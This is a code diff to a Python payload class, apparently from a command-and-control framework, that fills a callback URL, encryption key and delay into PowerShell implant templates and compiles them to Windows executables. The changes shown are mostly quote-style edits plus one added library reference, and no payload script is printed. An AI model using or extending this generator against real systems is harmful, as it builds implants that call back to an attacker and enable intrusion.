@@ -13,7 +13,7 @@ from core.rc4 import RC4
 class Payload:
 
     DEFAULT_DELAY = 10000
-    DEFAULT_TYPE = 'ps'
+    DEFAULT_TYPE = "ps"
 
     def __init__(self, config):
         self.config = config
@@ -48,8 +48,7 @@ class Payload:
 
     def get_output(self):
         output = Utils.load_powershell_script(self.type[self.option], 999)
-        output = output.replace('[URL]', self.callback_url).replace('[KEY]', self.config.get('encryption-key')).replace('[DELAY]', str(self.delay))
-
+        output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay))
         if self.option == "exe":
             output = self.compile_exe(output)
         if self.option == "msbuild":
@@ -58,16 +57,16 @@ class Payload:
 
     def compile_exe(self, data):
         output = ""
-        filename = '/tmp/%s' % Utils.gen_str(10)
-        open(filename, 'wb+').write(data)
+        filename = "/tmp/%s" % Utils.gen_str(10)
+        open(filename, "w+").write(data)
         cmdline = \
-            'mcs %s -out:%s.exe -r:bin/System.Management.Automation.dll -r:bin/System.Web.Extensions.dll -r:bin/System.Windows.Forms.dll > /dev/null 2>&1' \
+            "mcs %s -out:%s.exe -r:bin/System.Drawing.dll -r:bin/System.Management.Automation.dll -r:bin/System.Web.Extensions.dll -r:bin/System.Windows.Forms.dll > /dev/null 2>&1" \
             % (filename, filename)
 
         os.system(cmdline)
-        output = open('%s.exe' % filename, 'rb').read()
+        output = open("%s.exe" % filename, "rb").read()
         os.remove(filename)
-        os.remove('%s.exe' % filename)
+        os.remove("%s.exe" % filename)
 
         return output
 
